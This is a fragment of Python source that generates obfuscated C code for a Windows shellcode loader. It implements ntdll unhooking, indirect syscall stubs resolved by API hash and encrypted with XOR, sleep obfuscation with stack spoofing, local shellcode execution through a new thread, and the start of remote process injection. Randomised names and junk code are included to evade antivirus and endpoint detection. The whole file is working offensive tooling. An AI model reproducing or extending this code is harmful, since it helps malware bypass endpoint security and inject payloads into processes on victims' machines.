    lines.extend(rc)
    lines.append(c_stack_string("ntdll.dll", nd))
    lines.append("    char %s[MAX_PATH];" % fp)
    lines.append("    %s(%s, MAX_PATH);" % (p['GetSystemDirectoryA'], fp))
    lines.append("    UINT %s = 0; while (%s[%s]) %s++;" % (kv, fp, kv, kv))
    lines.append("    if (%s + 12 >= MAX_PATH) return;" % kv)
    lines.append("    %s[%s] = 0x5C; %s++;" % (fp, kv, kv))
    lines.append("    int %s;" % iv)
    lines.append("    for (%s = 0; %s[%s]; %s++) %s[%s + %s] = %s[%s];" % (iv, nd, iv, iv, fp, kv, iv, nd, iv))
    lines.append("    %s[%s + %s] = 0;" % (fp, kv, iv))
    lines.append("    HANDLE %s = %s(%s, 0x80000000, 1, NULL, 3, 0, NULL);" % (hf, p['CreateFileA'], fp))
    lines.append("    if (%s == INVALID_HANDLE_VALUE) return;" % hf)
    lines.append("    HANDLE %s = %s(%s, NULL, 0x01000000 | 2, 0, 0, NULL);" % (hm, p['CreateFileMappingA'], hf))
    lines.append("    if (!%s) { %s(%s); return; }" % (hm, p['CloseHandle'], hf))
    lines.append("    unsigned char* %s = (unsigned char*)%s(%s, 4, 0, 0, 0);" % (mb, p['MapViewOfFile'], hm))
    lines.append("    if (!%s) { %s(%s); %s(%s); return; }" % (mb, p['CloseHandle'], hm, p['CloseHandle'], hf))
    lines.append("    HMODULE %s = %s(%s);" % (ml, p['GetModuleHandleA'], nd))
    lines.append("    if (!%s) { %s(%s); %s(%s); %s(%s); return; }" % (ml, p['UnmapViewOfFile'], mb, p['CloseHandle'], hm, p['CloseHandle'], hf))
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, mb))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)(%s + %s->e_lfanew);" % (nh, mb, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sec, nh))
    iv2 = rand_id(6)
    lines.append("    for (int %s = 0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv2, iv2, nh, iv2))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {" % (sec, iv2))
    lines.append("            unsigned char* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (dst, ml, sec, iv2))
    lines.append("            unsigned char* %s = %s + %s[%s].VirtualAddress;" % (src, mb, sec, iv2))
    lines.append("            DWORD %s;" % op)
    lines.append("            if (%s(%s, %s[%s].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &%s)) {" % (p['VirtualProtect'], dst, sec, iv2, op))
    lines.append("                memcpy(%s, %s, %s[%s].Misc.VirtualSize);" % (dst, src, sec, iv2))
    lines.append("                %s(%s, %s[%s].Misc.VirtualSize, %s, &%s);" % (p['VirtualProtect'], dst, sec, iv2, op, op))
    lines.append("            }")
    lines.append("            break;")
    lines.append("        }")
    lines.append("    }")
    lines.append("    %s(%s);" % (p['UnmapViewOfFile'], mb))
    lines.append("    %s(%s);" % (p['CloseHandle'], hm))
    lines.append("    %s(%s);" % (p['CloseHandle'], hf))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_syscall_infra(resolve_fn):
    wrapper_map = {}
    lines = []

    pfx = rand_id(4)
    oattr_t = pfx + "_oa"
    cid_t = pfx + "_ci"

    lines.append("typedef LONG NTSTATUS;")
    lines.append("#ifndef NT_SUCCESS")
    lines.append("#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)")
    lines.append("#endif")
    lines.append("typedef struct { ULONG Length; HANDLE RootDirectory; PVOID ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } %s;" % oattr_t)
    lines.append("typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } %s;" % cid_t)
    lines.append("")

    nt_td = {}
    for name, ret, params in SYSCALL_APIS:
        td = rand_id(8)
        fixed = params.replace('POBJECT_ATTRIBUTES', '%s*' % oattr_t).replace('PCLIENT_ID', '%s*' % cid_t)
        lines.append("typedef %s (NTAPI* %s)(%s);" % (ret, td, fixed))
        nt_td[name] = td

    nt_gp = {}
    for name, _, _ in SYSCALL_APIS:
        gp = rand_id(8)
        lines.append("static %s %s = NULL;" % (nt_td[name], gp))
        nt_gp[name] = gp
    lines.append("")

    stub_va_td = rand_id(8)
    stub_vp_td = rand_id(8)
    stub_va = rand_id(8)
    stub_vp = rand_id(8)
    lines.append("typedef LPVOID (WINAPI* %s)(LPVOID,SIZE_T,DWORD,DWORD);" % stub_va_td)
    lines.append("typedef BOOL (WINAPI* %s)(LPVOID,SIZE_T,DWORD,PDWORD);" % stub_vp_td)
    lines.append("static %s %s = NULL;" % (stub_va_td, stub_va))
    lines.append("static %s %s = NULL;" % (stub_vp_td, stub_vp))
    lines.append("")

    get_ssn = rand_id()
    a = rand_id(6)
    nb = rand_id(6)
    i = rand_id(6)
    p = rand_id(6)
    cnt = rand_id(6)
    rv = rand_id(6)
    lines.append("static DWORD %s(unsigned char* %s) {" % (get_ssn, a))
    lines.append("    if (%s[0]==0x4C && %s[1]==0x8B && %s[2]==0xD1 && %s[3]==0xB8)" % (a, a, a, a))
    lines.append("        return *(DWORD*)(%s+4);" % a)
    lines.append("    for (DWORD %s=1; %s<2048; %s++) {" % (i, i, i))
    lines.append("        unsigned char* %s=%s-%s;" % (nb, a, i))
    lines.append("        if (%s[0]==0x4C&&%s[1]==0x8B&&%s[2]==0xD1&&%s[3]==0xB8) {" % (nb, nb, nb, nb))
    lines.append("            DWORD %s=0;" % cnt)
    lines.append("            for (unsigned char* %s=%s+8; %s<%s; %s++) {" % (p, nb, p, a, p))
    lines.append("                if (%s[0]==0x4C&&%s[1]==0x8B&&%s[2]==0xD1&&%s[3]==0xB8) %s++;" % (p, p, p, p, cnt))
    lines.append("            }")
    lines.append("            DWORD %s=*(DWORD*)(%s+4)+%s+1;" % (rv, nb, cnt))
    lines.append("            return %s<0x200?%s:(DWORD)-1;" % (rv, rv))
    lines.append("        }")
    lines.append("        %s=%s+%s;" % (nb, a, i))
    lines.append("        if (%s[0]==0x4C&&%s[1]==0x8B&&%s[2]==0xD1&&%s[3]==0xB8) {" % (nb, nb, nb, nb))
    lines.append("            DWORD %s=0;" % cnt)
    lines.append("            for (unsigned char* %s=%s+8; %s<%s; %s++) {" % (p, a, p, nb, p))
    lines.append("                if (%s[0]==0x4C&&%s[1]==0x8B&&%s[2]==0xD1&&%s[3]==0xB8) %s++;" % (p, p, p, p, cnt))
    lines.append("            }")
    lines.append("            DWORD %s=*(DWORD*)(%s+4)-%s-1;" % (rv, nb, cnt))
    lines.append("            return %s<0x200?%s:(DWORD)-1;" % (rv, rv))
    lines.append("        }")
    lines.append("    }")
    lines.append("    return (DWORD)-1;")
    lines.append("}")
    lines.append("")

    find_gad = rand_id()
    bv = rand_id(6)
    dh = rand_id(6)
    nh = rand_id(6)
    sc = rand_id(6)
    iv = rand_id(6)
    st = rand_id(6)
    jv = rand_id(6)
    lines.append("static void* %s(void* %s) {" % (find_gad, bv))
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, bv))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, bv, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sc, nh))
    lines.append("    for (int %s=0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv, iv, nh, iv))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {" % (sc, iv))
    lines.append("            if (%s[%s].Misc.VirtualSize < 3) continue;" % (sc, iv))
    lines.append("            unsigned char* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (st, bv, sc, iv))
    lines.append("            for (DWORD %s=0; %s < %s[%s].Misc.VirtualSize-2; %s++) {" % (jv, jv, sc, iv, jv))
    lines.append("                if (%s[%s]==0x0F && %s[%s+1]==0x05 && %s[%s+2]==0xC3) return &%s[%s];" % (st, jv, st, jv, st, jv, st, jv))
    lines.append("            }")
    lines.append("        }")
    lines.append("    }")
    lines.append("    return NULL;")
    lines.append("}")
    lines.append("")

    make_stub = rand_id()
    sp = rand_id(6)
    gp = rand_id(6)
    sb = rand_id(6)
    ex = rand_id(6)
    dp = rand_id(6)
    lines.append("static void* %s(DWORD %s, void* %s) {" % (make_stub, sp, gp))
    lines.append("    if (%s == (DWORD)-1 || !%s || !%s || !%s) return NULL;" % (sp, gp, stub_va, stub_vp))
    lines.append("    unsigned char %s[] = {" % sb)
    lines.append("        0x4C,0x8B,0xD1,")
    lines.append("        0xB8,0x00,0x00,0x00,0x00,")
    lines.append("        0x49,0xBB,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,")
    lines.append("        0x41,0xFF,0xE3")
    lines.append("    };")
    lines.append("    *(DWORD*)(%s+4) = %s;" % (sb, sp))
    lines.append("    *(ULONG_PTR*)(%s+10) = (ULONG_PTR)%s;" % (sb, gp))
    lines.append("    void* %s = %s(NULL, sizeof(%s), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);" % (ex, stub_va, sb))
    lines.append("    if (!%s) return NULL;" % ex)
    lines.append("    memcpy(%s, %s, sizeof(%s));" % (ex, sb, sb))
    lines.append("    DWORD %s;" % dp)
    lines.append("    %s(%s, sizeof(%s), PAGE_EXECUTE_READ, &%s);" % (stub_vp, ex, sb, dp))
    lines.append("    return %s;" % ex)
    lines.append("}")
    lines.append("")

    stub_enc_key = secrets.token_bytes(8)
    stub_key_hex = ", ".join("0x%02x" % b for b in stub_enc_key)
    stub_key_var = rand_id(8)
    lines.append("static unsigned char %s[] = {%s};" % (stub_key_var, stub_key_hex))
    lines.append("")

    init_fn = rand_id()
    ntdll_base = rand_id(6)
    gad_v = rand_id(6)
    ntdll_hash = djb2_hash("ntdll.dll")
    k32_hash = djb2_hash("kernel32.dll")
    va_fn_hash = djb2_hash("VirtualAlloc")
    vp_fn_hash = djb2_hash("VirtualProtect")
    lines.append("static void %s() {" % init_fn)
    lines.append("    %s = (%s)%s(0x%08xu, 0x%08xu);" % (stub_va, stub_va_td, resolve_fn, k32_hash, va_fn_hash))
    lines.append("    %s = (%s)%s(0x%08xu, 0x%08xu);" % (stub_vp, stub_vp_td, resolve_fn, k32_hash, vp_fn_hash))
    lines.append("    if (!%s || !%s) return;" % (stub_va, stub_vp))
    lines.append("    void* %s = %s(0x%08xu, 0);" % (ntdll_base, resolve_fn, ntdll_hash))
    lines.append("    if (!%s) return;" % ntdll_base)
    lines.append("    void* %s = %s(%s);" % (gad_v, find_gad, ntdll_base))
    lines.append("    if (!%s) return;" % gad_v)

    for name, _, _ in SYSCALL_APIS:
        av = rand_id(6)
        func_hash = djb2_hash(name)
        lines.append("    unsigned char* %s = (unsigned char*)%s(0x%08xu, 0x%08xu);" % (av, resolve_fn, ntdll_hash, func_hash))
        lines.append("    if (%s) %s = (%s)%s(%s(%s), %s);" % (av, nt_gp[name], nt_td[name], make_stub, get_ssn, av, gad_v))

    stub_xor_fn = rand_id()
    stub_xv = rand_id(6)
    stub_xb = rand_id(6)
    stub_xs = rand_id(6)
    stub_xo = rand_id(6)
    stub_xi = rand_id(6)
    stub_sz = "21"

    pre_xi = rand_id(6)
    pre_op = rand_id(6)
    lines.append("    DWORD %s;" % pre_op)
    for name, _, _ in SYSCALL_APIS:
        lines.append("    if (%s) { %s((void*)%s, %s, PAGE_READWRITE, &%s);" % (
            nt_gp[name], stub_vp, nt_gp[name], stub_sz, pre_op))
        lines.append("        for (int %s=0; %s<%s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s%%8];" % (
            pre_xi, pre_xi, stub_sz, pre_xi, nt_gp[name], pre_xi, stub_key_var, pre_xi))
        lines.append("        %s((void*)%s, %s, PAGE_EXECUTE_READ, &%s); }" % (
            stub_vp, nt_gp[name], stub_sz, pre_op))

    lines.append("}")
    lines.append("")
    lines.append("static void %s(void* %s, SIZE_T %s) {" % (stub_xor_fn, stub_xb, stub_xs))
    lines.append("    if (!%s || !%s) return;" % (stub_xb, stub_vp))
    lines.append("    DWORD %s;" % stub_xo)
    lines.append("    %s(%s, %s, PAGE_READWRITE, &%s);" % (stub_vp, stub_xb, stub_xs, stub_xo))
    lines.append("    for (SIZE_T %s = 0; %s < %s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s %% 8];" % (stub_xi, stub_xi, stub_xs, stub_xi, stub_xb, stub_xi, stub_key_var, stub_xi))
    lines.append("    %s(%s, %s, %s, &%s);" % (stub_vp, stub_xb, stub_xs, stub_xo, stub_xo))
    lines.append("}")
    lines.append("")

    wa = rand_id()
    v = {k: rand_id(6) for k in ['a', 's', 't', 'p', 'b', 'sz', 'st']}
    lines.append("static LPVOID %s(LPVOID %s, SIZE_T %s, DWORD %s, DWORD %s) {" % (wa, v['a'], v['s'], v['t'], v['p']))
    lines.append("    void* %s = %s; SIZE_T %s = %s;" % (v['b'], v['a'], v['sz'], v['s']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtAllocateVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s((HANDLE)-1, &%s, 0, &%s, %s, %s);" % (v['st'], nt_gp['NtAllocateVirtualMemory'], v['b'], v['sz'], v['t'], v['p']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtAllocateVirtualMemory'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : NULL;" % (v['st'], v['b']))
    lines.append("}")
    wrapper_map['VirtualAlloc'] = wa

    wa2 = rand_id()
    v = {k: rand_id(6) for k in ['h', 'a', 's', 't', 'p', 'b', 'sz', 'st']}
    lines.append("static LPVOID %s(HANDLE %s, LPVOID %s, SIZE_T %s, DWORD %s, DWORD %s) {" % (wa2, v['h'], v['a'], v['s'], v['t'], v['p']))
    lines.append("    void* %s = %s; SIZE_T %s = %s;" % (v['b'], v['a'], v['sz'], v['s']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtAllocateVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, &%s, 0, &%s, %s, %s);" % (v['st'], nt_gp['NtAllocateVirtualMemory'], v['h'], v['b'], v['sz'], v['t'], v['p']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtAllocateVirtualMemory'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : NULL;" % (v['st'], v['b']))
    lines.append("}")
    wrapper_map['VirtualAllocEx'] = wa2

    wp = rand_id()
    v = {k: rand_id(6) for k in ['a', 's', 'n', 'o', 'b', 'sz', 'op', 'st']}
    lines.append("static BOOL %s(LPVOID %s, SIZE_T %s, DWORD %s, PDWORD %s) {" % (wp, v['a'], v['s'], v['n'], v['o']))
    lines.append("    void* %s = %s; SIZE_T %s = %s; ULONG %s = 0;" % (v['b'], v['a'], v['sz'], v['s'], v['op']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtProtectVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s((HANDLE)-1, &%s, &%s, %s, &%s);" % (v['st'], nt_gp['NtProtectVirtualMemory'], v['b'], v['sz'], v['n'], v['op']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtProtectVirtualMemory'], stub_sz))
    lines.append("    if (NT_SUCCESS(%s)) *%s = %s; return NT_SUCCESS(%s);" % (v['st'], v['o'], v['op'], v['st']))
    lines.append("}")
    wrapper_map['VirtualProtect'] = wp
    wpe = rand_id()
    v = {k: rand_id(6) for k in ['h', 'a', 's', 'n', 'o', 'b', 'sz', 'op', 'st']}
    lines.append("static BOOL %s(HANDLE %s, LPVOID %s, SIZE_T %s, DWORD %s, PDWORD %s) {" % (wpe, v['h'], v['a'], v['s'], v['n'], v['o']))
    lines.append("    void* %s = %s; SIZE_T %s = %s; ULONG %s = 0;" % (v['b'], v['a'], v['sz'], v['s'], v['op']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtProtectVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, &%s, &%s, %s, &%s);" % (v['st'], nt_gp['NtProtectVirtualMemory'], v['h'], v['b'], v['sz'], v['n'], v['op']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtProtectVirtualMemory'], stub_sz))
    lines.append("    if (NT_SUCCESS(%s)) *%s = %s; return NT_SUCCESS(%s);" % (v['st'], v['o'], v['op'], v['st']))
    lines.append("}")
    wrapper_map['VirtualProtectEx'] = wpe

    wwpm = rand_id()
    v = {k: rand_id(6) for k in ['h', 'a', 'b', 's', 'w', 'wr', 'st']}
    lines.append("static BOOL %s(HANDLE %s, LPVOID %s, LPCVOID %s, SIZE_T %s, SIZE_T* %s) {" % (wwpm, v['h'], v['a'], v['b'], v['s'], v['w']))
    lines.append("    SIZE_T %s = 0;" % v['wr'])
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtWriteVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, %s, (PVOID)%s, %s, &%s);" % (v['st'], nt_gp['NtWriteVirtualMemory'], v['h'], v['a'], v['b'], v['s'], v['wr']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtWriteVirtualMemory'], stub_sz))
    lines.append("    if (%s) *%s = %s;" % (v['w'], v['w'], v['wr']))
    lines.append("    return NT_SUCCESS(%s);" % v['st'])
    lines.append("}")
    wrapper_map['WriteProcessMemory'] = wwpm

    wct = rand_id()
    v = {k: rand_id(6) for k in ['sa', 'ss', 'fn', 'pm', 'fl', 'id', 'th', 'st']}
    lines.append("static HANDLE %s(LPSECURITY_ATTRIBUTES %s, SIZE_T %s, LPTHREAD_START_ROUTINE %s, LPVOID %s, DWORD %s, LPDWORD %s) {" % (wct, v['sa'], v['ss'], v['fn'], v['pm'], v['fl'], v['id']))
    lines.append("    HANDLE %s = NULL;" % v['th'])
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtCreateThreadEx'], stub_sz))
    lines.append("    NTSTATUS %s = %s(&%s, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)%s, %s, %s&0x4?TRUE:FALSE, 0, 0, 0, NULL);" % (v['st'], nt_gp['NtCreateThreadEx'], v['th'], v['fn'], v['pm'], v['fl']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtCreateThreadEx'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : NULL;" % (v['st'], v['th']))
    lines.append("}")
    wrapper_map['CreateThread'] = wct

    wcrt = rand_id()
    v = {k: rand_id(6) for k in ['hp', 'sa', 'ss', 'fn', 'pm', 'fl', 'id', 'th', 'st']}
    lines.append("static HANDLE %s(HANDLE %s, LPSECURITY_ATTRIBUTES %s, SIZE_T %s, LPTHREAD_START_ROUTINE %s, LPVOID %s, DWORD %s, LPDWORD %s) {" % (wcrt, v['hp'], v['sa'], v['ss'], v['fn'], v['pm'], v['fl'], v['id']))
    lines.append("    HANDLE %s = NULL;" % v['th'])
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtCreateThreadEx'], stub_sz))
    lines.append("    NTSTATUS %s = %s(&%s, THREAD_ALL_ACCESS, NULL, %s, (PVOID)%s, %s, %s&0x4?TRUE:FALSE, 0, 0, 0, NULL);" % (v['st'], nt_gp['NtCreateThreadEx'], v['th'], v['hp'], v['fn'], v['pm'], v['fl']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtCreateThreadEx'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : NULL;" % (v['st'], v['th']))
    lines.append("}")
    wrapper_map['CreateRemoteThread'] = wcrt

    wop = rand_id()
    v = {k: rand_id(6) for k in ['ac', 'ih', 'pd', 'hp', 'oa', 'ci', 'st']}
    lines.append("static HANDLE %s(DWORD %s, BOOL %s, DWORD %s) {" % (wop, v['ac'], v['ih'], v['pd']))
    lines.append("    HANDLE %s = NULL;" % v['hp'])
    lines.append("    %s %s; memset(&%s, 0, sizeof(%s)); %s.Length = sizeof(%s);" % (oattr_t, v['oa'], v['oa'], v['oa'], v['oa'], v['oa']))
    lines.append("    %s %s; %s.UniqueProcess = (HANDLE)(ULONG_PTR)%s; %s.UniqueThread = 0;" % (cid_t, v['ci'], v['ci'], v['pd'], v['ci']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtOpenProcess'], stub_sz))
    lines.append("    NTSTATUS %s = %s(&%s, %s, &%s, &%s);" % (v['st'], nt_gp['NtOpenProcess'], v['hp'], v['ac'], v['oa'], v['ci']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtOpenProcess'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : NULL;" % (v['st'], v['hp']))
    lines.append("}")
    wrapper_map['OpenProcess'] = wop

    wqa = rand_id()
    v = {k: rand_id(6) for k in ['th', 'fn', 'pm', 'st']}
    lines.append("static DWORD %s(void* %s, HANDLE %s, ULONG_PTR %s) {" % (wqa, v['fn'], v['th'], v['pm']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtQueueApcThread'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, %s, (PVOID)%s, NULL, NULL);" % (v['st'], nt_gp['NtQueueApcThread'], v['th'], v['fn'], v['pm']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtQueueApcThread'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? 1 : 0;" % v['st'])
    lines.append("}")
    wrapper_map['QueueUserAPC'] = wqa

    wrt = rand_id()
    v = {k: rand_id(6) for k in ['th', 'sc', 'st']}
    lines.append("static DWORD %s(HANDLE %s) {" % (wrt, v['th']))
    lines.append("    ULONG %s = 0;" % v['sc'])
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtResumeThread'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, &%s);" % (v['st'], nt_gp['NtResumeThread'], v['th'], v['sc']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtResumeThread'], stub_sz))
    lines.append("    return NT_SUCCESS(%s) ? %s : (DWORD)-1;" % (v['st'], v['sc']))
    lines.append("}")
    wrapper_map['ResumeThread'] = wrt

    wrpm = rand_id()
    v = {k: rand_id(6) for k in ['h', 'a', 'b', 's', 'rd', 'br', 'st']}
    lines.append("static BOOL %s(HANDLE %s, LPCVOID %s, LPVOID %s, SIZE_T %s, SIZE_T* %s) {" % (wrpm, v['h'], v['a'], v['b'], v['s'], v['rd']))
    lines.append("    SIZE_T %s = 0;" % v['br'])
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtReadVirtualMemory'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, (PVOID)%s, %s, %s, &%s);" % (v['st'], nt_gp['NtReadVirtualMemory'], v['h'], v['a'], v['b'], v['s'], v['br']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtReadVirtualMemory'], stub_sz))
    lines.append("    if (%s) *%s = %s;" % (v['rd'], v['rd'], v['br']))
    lines.append("    return NT_SUCCESS(%s);" % v['st'])
    lines.append("}")
    wrapper_map['ReadProcessMemory'] = wrpm

    wmvs = rand_id()
    v = {k: rand_id(6) for k in ['hs', 'hp', 'ba', 'zb', 'cs', 'so', 'vs', 'it', 'at', 'pr', 'st']}
    lines.append("static NTSTATUS %s(HANDLE %s, HANDLE %s, PVOID* %s, ULONG_PTR %s, SIZE_T %s, PLARGE_INTEGER %s, PSIZE_T %s, ULONG %s, ULONG %s, ULONG %s) {" % (wmvs, v['hs'], v['hp'], v['ba'], v['zb'], v['cs'], v['so'], v['vs'], v['it'], v['at'], v['pr']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtMapViewOfSection'], stub_sz))
    lines.append("    NTSTATUS %s = %s(%s, %s, %s, %s, %s, %s, %s, %s, %s, %s);" % (v['st'], nt_gp['NtMapViewOfSection'], v['hs'], v['hp'], v['ba'], v['zb'], v['cs'], v['so'], v['vs'], v['it'], v['at'], v['pr']))
    lines.append("    %s((void*)%s, %s);" % (stub_xor_fn, nt_gp['NtMapViewOfSection'], stub_sz))
    lines.append("    return %s;" % v['st'])
    lines.append("}")
    wrapper_map['NtMapViewOfSection'] = wmvs

    return wrapper_map, init_fn, "\n".join(lines)

def gen_sleep_obf(resolve_fn, syscall_map=None, spoof_stack=False):
    gb = rand_id()
    gs = rand_id()
    fn = rand_id()
    ptr_vp, r_vp = gen_resolve(resolve_fn, 'VirtualProtect', syscall_map)
    tp, trc = _multi_resolve(resolve_fn, [
        'CreateEventW', 'CreateTimerQueue', 'CreateTimerQueueTimer',
        'WaitForSingleObject', 'DeleteTimerQueueEx', 'SetEvent'])
    sleep_key = secrets.token_bytes(16)
    key_hex = ", ".join("0x%02x" % b for b in sleep_key)
    xk = rand_id(8)
    ev = rand_id(8)
    hq = rand_id(8)
    ht = rand_id(8)
    op = rand_id(8)
    iv2 = rand_id(6)
    iv3 = rand_id(6)
    globals_code = "void* %s = NULL;\nSIZE_T %s = 0;" % (gb, gs)
    lines = ["void %s() {" % fn]
    if r_vp:
        lines.append(r_vp)
    lines.extend(trc)
    lines.append("    HANDLE %s = %s(NULL, FALSE, FALSE, NULL);" % (ev, tp['CreateEventW']))
    lines.append("    if (!%s) return;" % ev)
    lines.append("    unsigned char %s[] = {%s};" % (xk, key_hex))
    if spoof_stack:
        sa = rand_id(8)
        ss = rand_id(6)
        sk = rand_id(6)
        lines.append("    volatile DWORD %s = 0;" % sa)
        lines.append("    unsigned char* %s = (unsigned char*)&%s + 0x200;" % (ss, sa))
    lines.append("    while (1) {")
    lines.append("        DWORD %s;" % op)
    lines.append("        %s(%s, (SIZE_T)%s, PAGE_READWRITE, &%s);" % (ptr_vp, gb, gs, op))
    lines.append("        for (SIZE_T %s = 0; %s < (SIZE_T)%s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s %% 16];" % (iv2, iv2, gs, iv2, gb, iv2, xk, iv2))
    if spoof_stack:
        lines.append("        for (SIZE_T %s = 0; %s < 0x1000; %s++) %s[%s] ^= %s[%s %% 16];" % (sk, sk, sk, ss, sk, xk, sk))
    lines.append("        HANDLE %s = %s();" % (hq, tp['CreateTimerQueue']))
    lines.append("        HANDLE %s = NULL;" % ht)
    sl_delay = rand_id(6)
    lines.append("        DWORD %s = %d + (GetTickCount64() %% %d);" % (sl_delay, random.randint(15000, 25000), random.randint(10000, 35000)))
    lines.append("        %s(&%s, %s, (void*)%s, %s, %s, 0, 0x00000020);" % (tp['CreateTimerQueueTimer'], ht, hq, tp['SetEvent'], ev, sl_delay))
    lines.append("        %s(%s, 0xFFFFFFFF);" % (tp['WaitForSingleObject'], ev))
    lines.append("        %s(%s, NULL);" % (tp['DeleteTimerQueueEx'], hq))
    if spoof_stack:
        lines.append("        for (SIZE_T %s = 0; %s < 0x1000; %s++) %s[%s] ^= %s[%s %% 16];" % (sk, sk, sk, ss, sk, xk, sk))
    lines.append("        for (SIZE_T %s = 0; %s < (SIZE_T)%s; %s++) ((unsigned char*)%s)[%s] ^= %s[%s %% 16];" % (iv3, iv3, gs, iv3, gb, iv3, xk, iv3))
    lines.append("        %s(%s, (SIZE_T)%s, PAGE_EXECUTE_READ, &%s);" % (ptr_vp, gb, gs, op))
    lines.append("    }")
    lines.append("}")
    return fn, gb, gs, globals_code, "\n".join(lines)

def gen_local(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o, t = [rand_id() for _ in range(5)]
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'CreateThread', 'WaitForSingleObject'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (t, p['CreateThread'], m))
    lines.append("    if (!%s) return;" % t)
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    else:
        lines.append("    %s(%s, 0xFFFFFFFF);" % (p['WaitForSingleObject'], t))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_inject(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None):
    fn = rand_id()
    s, l, pv, h, m, o = [rand_id() for _ in range(6)]
    p, rc = _multi_resolve(resolve_fn, ['OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory',
                                         'VirtualProtectEx', 'CreateRemoteThread', 'CloseHandle'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s, DWORD %s) {" % (fn, s, l, pv)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
